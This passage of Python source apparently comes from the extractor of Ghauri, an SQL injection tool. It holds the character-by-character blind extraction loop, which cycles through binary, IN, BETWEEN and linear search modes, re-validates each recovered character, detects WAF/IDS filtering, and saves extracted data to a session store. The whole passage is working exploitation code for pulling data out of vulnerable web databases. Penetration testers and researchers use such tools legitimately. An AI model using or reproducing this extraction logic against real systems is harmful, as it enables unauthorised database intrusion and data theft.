                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                base=base,
                                                injection_type=injection_type,
                                                delay=delay,
                                                timesec=timesec,
                                                timeout=timeout,
                                                proxy=proxy,
                                                is_multipart=is_multipart,
                                                suppress_output=suppress_output,
                                                query_check=query_check,
                                                minimum=32,
                                                maximum=127,
                                                offset=pos,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                vector_type=vector_type,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    invalid_character_detection_counter += (
                                                        1
                                                    )
                                                    binary_search = False
                                                    in_based_search = False
                                                    linear_search = False
                                                    between_based_search = True
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        elif in_based_search:
                                            retval = self._search_using_in_operator(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                base=base,
                                                injection_type=injection_type,
                                                delay=delay,
                                                timesec=timesec,
                                                timeout=timeout,
                                                proxy=proxy,
                                                is_multipart=is_multipart,
                                                suppress_output=suppress_output,
                                                query_check=query_check,
                                                minimum=32,
                                                maximum=127,
                                                offset=pos,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                vector_type=vector_type,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying.."
                                                    )
                                                    invalid_character_detection_counter += (
                                                        1
                                                    )
                                                    binary_search = False
                                                    in_based_search = False
                                                    linear_search = True
                                                    between_based_search = False
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        elif between_based_search:
                                            retval = (
                                                self._search_using_between_operator(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    timeout=timeout,
                                                    proxy=proxy,
                                                    attack01=attack01,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    is_multipart=is_multipart,
                                                    suppress_output=suppress_output,
                                                    query_check=query_check,
                                                    minimum=32,
                                                    maximum=127,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    chars=chars,
                                                    text_only=text_only,
                                                    vector_type=vector_type,
                                                )
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    attack01=attack01,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    bool_invalid_character_counter += 1
                                                    binary_search = False
                                                    between_based_search = False
                                                    in_based_search = True
                                                    linear_search = False
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        else:
                                            retval = self._linear_search(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                injection_type=injection_type,
                                                proxy=proxy,
                                                is_multipart=is_multipart,
                                                timeout=timeout,
                                                delay=delay,
                                                timesec=timesec,
                                                suppress_output=suppress_output,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                offset=pos,
                                                list_of_chars=list_of_chars,
                                                vector_type=vector_type,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying.."
                                                    )
                                                    invalid_character_detection_counter += (
                                                        1
                                                    )
                                                    binary_search = (
                                                        retval_check.binary_search
                                                    )
                                                    in_based_search = (
                                                        retval_check.in_based_search
                                                    )
                                                    linear_search = (
                                                        retval_check.linear_search
                                                    )
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        try:
                                            if invalid_character_detection_counter >= 3:
                                                logger.debug(
                                                    "it seems the current payload is filtered out by some sort of WAF/IDS."
                                                )
                                                break
                                            if (
                                                dump_type
                                                and chars
                                                and not conf.fresh_queries
                                            ):
                                                session.dump(
                                                    session_filepath=conf.session_filepath,
                                                    query=STORAGE_UPDATE,
                                                    values=(
                                                        chars,
                                                        last_row_id,
                                                        dump_type,
                                                    ),
                                                )
                                        except Exception as error:
                                            logger.warning(error)
                                        logger.debug(
                                            f"character(s) found: '{str(chars)}'"
                                        )
                                    except KeyboardInterrupt:
                                        is_char_found = True
                                        is_extracted = True
                                        is_done_with_vector = True
                                        if chars and len(chars) > 0:
                                            logger.info(f"retrieved: '{chars}'")
                                        _temp = PayloadResponse(
                                            ok=False,
                                            error="user_ended",
                                            result=chars,
                                            payload=entry,
                                            resumed=is_resumed,
                                        )
                                        break
                        if len(chars) == length:
                            is_char_found = True
                            _temp = PayloadResponse(
                                ok=True,
                                error="",
                                result=chars,
                                payload=entry,
                                resumed=False,
                            )
                            response = chars
                            break
                    if is_char_found:
                        is_extracted = True
                        break
                if is_extracted:
                    is_done_with_vector = True
                    break
            if not is_done_with_vector:
                logger.debug(
                    f"Ghauri was not able to extract the data with vector type '{vector_type}', switching to other vector type(s) if any.."
                )
            if is_done_with_vector:
                break
        return _temp


ghauri_extractor = GhauriExtractor()
